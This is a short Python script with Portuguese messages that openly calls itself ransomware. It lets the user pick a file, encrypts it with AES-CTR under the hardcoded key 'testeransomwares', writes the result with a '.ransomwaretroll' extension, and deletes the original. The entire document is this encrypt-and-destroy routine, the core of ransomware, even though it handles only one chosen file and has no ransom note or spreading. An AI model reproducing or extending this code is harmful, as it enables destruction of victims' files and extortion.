import os
import pyaes
from tkinter import Tk, filedialog

def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()

            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            encrypted_file_path = file_path + ".ransomwaretroll"
            with open(encrypted_file_path, "wb") as new_file:
                new_file.write(crypto_data)

            print(f"Arquivo criptografado salvo como: {encrypted_file_path}")
            return encrypted_file_path
    except Exception as e:
        print(f"Ocorreu um erro durante a criptografia: {e}")
        return None

def main():
    root = Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(title="Selecione o arquivo para criptografar")

    if file_path:
        key = b"testeransomwares"  # Sua chave de criptografia

        encrypted_file = encrypt_file(file_path, key)
        if encrypted_file:
            try:
                os.remove(file_path)
                print(f"Arquivo original removido: {file_path}")
            except Exception as e:
                print(f"Não foi possível remover o arquivo original: {e}")

if __name__ == "__main__":
    main()
